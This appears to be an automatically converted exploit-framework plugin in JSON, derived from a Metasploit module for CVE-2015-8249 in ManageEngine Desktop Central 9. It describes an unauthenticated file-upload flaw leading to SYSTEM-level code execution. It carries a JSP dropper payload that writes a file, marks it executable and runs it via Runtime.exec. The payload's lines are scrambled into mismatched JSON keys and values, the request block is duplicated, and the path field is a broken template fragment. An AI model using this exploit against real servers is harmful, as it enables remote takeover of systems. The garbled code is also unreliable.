{
   "name" : "ManageengineConnectionidWrite",
   "cve" : "CVE-2015-8249",
   "msf_module" : "manageengine_connectionid_write",
   "references" : [
      "https://community.rapid7.com/community/infosec/blog/2015/12/14/r7-2015-22-manageengine-desktop-central-9-fileuploadservlet-connectionid-vulnerability-cve-2015-8249"
   ],
   "requests" : {
      "EXPLOIT1" : {
         "{\n" : "  char char1 = (char) data.charAt(counter);\n",
         "%>\n" : "<%@ page import=\"java.io.*\" %>\n",
         "TEXT" : "Sending Exploit #1 Request : [POST] /fileupload",
         "HEADERS" : {
            "Content-Type" : "application/octet-stream"
         },
         "PAYLOAD" : "<%@ page import=\"java.io.*\" %>\n",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "  bytes[counter/2] = (byte)comb;\n" : "}\n",
         "<%\n" : "try {\n",
         "FileOutputStream outputstream = new FileOutputStream(\"uFFkl.jsp\");\n" : "int numbytes = data.length();\n",
         "Runtime.getRuntime().exec(\"uFFkl.jsp\");\n" : "%>\n",
         "  comb <<= 4;\n" : "  comb += Character.digit(char2, 16) & 0xff;\n",
         "byte[] bytes = new byte[numbytes/2];\n" : "for (int counter = 0; counter < numbytes; counter += 2)\n",
         "METHOD" : "POST",
         "  char char2 = (char) data.charAt(counter + 1);\n" : "  int comb = Character.digit(char1, 16) & 0xff;\n",
         "PATH" : "fileupload",
         "  Runtime.getRuntime().exec(\"chmod +x uFFkl.jsp\");\n" : "} catch (IOException ioe) { }\n",
         "outputstream.write(bytes);\n" : "outputstream.close();\n"
      }
   },
   "paths" : [
      ""
   ],
   "detection" : {},
   "informations" : {
      "VARIABLES" : {
         "PATH" : {
            "VALUE" : "/",
            "DESCRIPTION" : "The base path for ManageEngine Desktop Central"
         }
      },
      "MSF_MODULE" : "manageengine_connectionid_write",
      "CVE" : "CVE-2015-8249",
      "DESCRIPTION" : "\n\n        This module exploits a vulnerability found in ManageEngine Desktop Central 9. When\n\n        uploading a 7z file, the FileUploadServlet class does not check the user-controlled\n\n        ConnectionId parameter in the FileUploadServlet class. This allows a remote attacker to\n\n        inject a null bye at the end of the value to create a malicious file with an arbitrary\n\n        file type, and then place it under a directory that allows server-side scripts to run,\n\n        which results in remote code execution under the context of SYSTEM.\n\n\n\n        Please note that by default, some ManageEngine Desktop Central versions run on port 8020,\n\n        but older ones run on port 8040. Also, using this exploit will leave debugging information\n\n        produced by FileUploadServlet in file rdslog0.txt.\n\n\n\n        This exploit was successfully tested on version 9, build 90109 and build 91084.\n\n      ",
      "name" : "ManageengineConnectionidWrite",
      "REQUESTS" : {
         "EXPLOIT1" : {
            "{\n" : "  char char1 = (char) data.charAt(counter);\n",
            "%>\n" : "<%@ page import=\"java.io.*\" %>\n",
            "TEXT" : "Sending Exploit #1 Request : [POST] /fileupload",
            "HEADERS" : {
               "Content-Type" : "application/octet-stream"
            },
            "PAYLOAD" : "<%@ page import=\"java.io.*\" %>\n",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "  bytes[counter/2] = (byte)comb;\n" : "}\n",
            "<%\n" : "try {\n",
            "FileOutputStream outputstream = new FileOutputStream(\"uFFkl.jsp\");\n" : "int numbytes = data.length();\n",
            "Runtime.getRuntime().exec(\"uFFkl.jsp\");\n" : "%>\n",
            "  comb <<= 4;\n" : "  comb += Character.digit(char2, 16) & 0xff;\n",
            "byte[] bytes = new byte[numbytes/2];\n" : "for (int counter = 0; counter < numbytes; counter += 2)\n",
            "METHOD" : "POST",
            "  char char2 = (char) data.charAt(counter + 1);\n" : "  int comb = Character.digit(char1, 16) & 0xff;\n",
            "PATH" : "fileupload",
            "  Runtime.getRuntime().exec(\"chmod +x uFFkl.jsp\");\n" : "} catch (IOException ioe) { }\n",
            "outputstream.write(bytes);\n" : "outputstream.close();\n"
         }
      },
      "METHOD" : "GET",
      "PATH" : "connectionId=#{Rex::Text.rand_text_alpha(1)&",
      "PATHS" : [
         ""
      ],
      "REFERENCES" : [
         "https://community.rapid7.com/community/infosec/blog/2015/12/14/r7-2015-22-manageengine-desktop-central-9-fileuploadservlet-connectionid-vulnerability-cve-2015-8249"
      ],
      "PLATFORM" : "WINDOWS",
      "TYPE" : "MSF"
   },
   "platform" : "WINDOWS",
   "method" : "GET",
   "type" : "MSF",
   "path" : "connectionId=#{Rex::Text.rand_text_alpha(1)&",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "description" : "\n\n        This module exploits a vulnerability found in ManageEngine Desktop Central 9. When\n\n        uploading a 7z file, the FileUploadServlet class does not check the user-controlled\n\n        ConnectionId parameter in the FileUploadServlet class. This allows a remote attacker to\n\n        inject a null bye at the end of the value to create a malicious file with an arbitrary\n\n        file type, and then place it under a directory that allows server-side scripts to run,\n\n        which results in remote code execution under the context of SYSTEM.\n\n\n\n        Please note that by default, some ManageEngine Desktop Central versions run on port 8020,\n\n        but older ones run on port 8040. Also, using this exploit will leave debugging information\n\n        produced by FileUploadServlet in file rdslog0.txt.\n\n\n\n        This exploit was successfully tested on version 9, build 90109 and build 91084.\n\n      ",
   "variables" : {
      "PATH" : {
         "VALUE" : "/",
         "DESCRIPTION" : "The base path for ManageEngine Desktop Central"
      }
   }
}
